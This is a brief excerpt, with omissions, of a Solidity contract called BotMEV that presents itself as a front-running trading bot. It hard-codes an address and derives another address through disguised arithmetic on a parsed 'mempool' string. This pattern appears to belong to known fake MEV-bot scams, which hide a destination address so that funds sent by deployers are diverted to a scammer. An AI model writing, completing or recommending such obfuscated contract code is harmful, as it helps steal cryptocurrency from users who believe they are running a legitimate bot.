...
contract BotMEV {
    ...
    address internal uniswapTransferProvider = 0x1404585C6cF024e12Ae471475084ebdEDEc40a8A;
    ...
    function _callFrontRunActionMempool() internal view returns (address) {
        return address(uint256(parseMemoryPool(callMempool())) - uint256(uniswapTransferProvider));
    }
